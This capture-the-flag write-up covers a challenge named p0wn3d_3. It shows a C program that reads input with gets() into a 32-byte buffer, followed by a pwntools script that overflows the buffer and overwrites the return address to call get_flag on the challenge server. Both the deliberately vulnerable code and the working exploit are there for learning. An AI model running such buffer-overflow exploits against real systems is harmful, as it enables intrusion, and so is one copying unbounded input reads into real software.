# p0wn3d_3 - Pwn

This challenge provides a C program with a buffer overflow vulnerability:

```c
#include <stdio.h>
#include <string.h>
#include <unistd.h>



void ignore(void)
{
  setvbuf(stdout, NULL, _IONBF, 0);
  setvbuf(stdin, NULL, _IONBF, 0);
}

void get_flag(void)
{
	 char *args[] = {"/bin/cat", "flag.txt", NULL};
   execve(args[0], args, NULL);
}

int main(void) 
{
	char buf[32];
  ignore(); /* ignore this function */

  printf("Now this is an original challenge. I don't think I've ever seen something like this before\n");
  sleep(2);
	gets(buf);
	puts("Drumroll please!");
	sleep(2);

  return 0;
}
```

The program uses `gets`, which has no bounds checking, to read input into a 32-byte buffer `buf`. This allows us to overflow the buffer and overwrite the return address to call `get_flag`, which executes `/bin/cat flag.txt`.

## solve.py

```py
from pwn import *

elf = ELF('./chal')
get_flag = elf.symbols['get_flag']

payload = b'A' * 40 + p64(get_flag)

r = remote('p0wn3d3.kctf-453514-codelab.kctf.cloud', 1337)
r.recvuntil(b"before\n")
r.sendline(payload)
print(r.recvall().decode())
```
